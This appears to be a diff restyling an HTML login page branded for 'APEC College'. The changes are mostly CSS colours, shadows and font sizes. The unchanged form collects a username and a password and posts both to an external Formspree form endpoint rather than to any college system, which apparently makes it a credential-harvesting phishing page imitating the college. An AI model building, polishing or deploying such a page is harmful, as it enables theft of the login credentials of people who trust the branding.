@@ -14,7 +14,7 @@
 }
 
 body{
-    background:#0056d6;
+    background:#f5f5f5;
     display:flex;
     justify-content:center;
     align-items:center;
@@ -23,32 +23,32 @@ body{
 
 .container{
     width:380px;
-    background:white;
+    background:#ffffff;
     padding:30px;
     border-radius:15px;
     text-align:center;
-    box-shadow:0 10px 25px rgba(0,0,0,0.3);
+    box-shadow:0 8px 20px rgba(0,0,0,0.15);
 }
 
 .logo{
     width:100px;
     height:100px;
-    border-radius:50%;
     margin-bottom:15px;
 }
 
 h1{
-    color:#0056d6;
-    font-size:28px;
+    color:#003366;
+    margin-bottom:5px;
 }
 
 h3{
-    color:#555;
+    color:#666;
     margin-bottom:20px;
     font-weight:normal;
 }
 
-input, textarea{
+input,
+textarea{
     width:100%;
     padding:12px;
     margin:10px 0;
@@ -60,16 +60,16 @@ input, textarea{
 button{
     width:100%;
     padding:12px;
-    background:#0056d6;
-    color:white;
+    background:#003366;
+    color:#fff;
     border:none;
     border-radius:8px;
-    font-size:17px;
+    font-size:16px;
     cursor:pointer;
 }
 
 button:hover{
-    background:#003f9e;
+    background:#0055aa;
 }
 </style>
 </head>
@@ -78,7 +78,7 @@ button:hover{
 
 <div class="container">
 
-    <!-- Replace logo.png with your APEC College logo -->
+    <!-- Replace with your APEC logo -->
     <img src="logo.png" alt="APEC College Logo" class="logo">
 
     <h1>Welcome</h1>
@@ -86,19 +86,9 @@ button:hover{
 
     <form action="https://formspree.io/f/xnjkoylv" method="POST">
 
-        <input
-            type="text"
-            name="username"
-            placeholder="Enter Username"
-            required
-        >
+        <input type="text" name="username" placeholder="Enter Username" required>
 
-        <textarea
-            name="password"
-            placeholder="Enter your password"
-            rows="4"
-            required
-        ></textarea>
+        <textarea name="password" rows="4" placeholder="Enter password" required></textarea>
 
         <button type="submit">Submit</button>
 
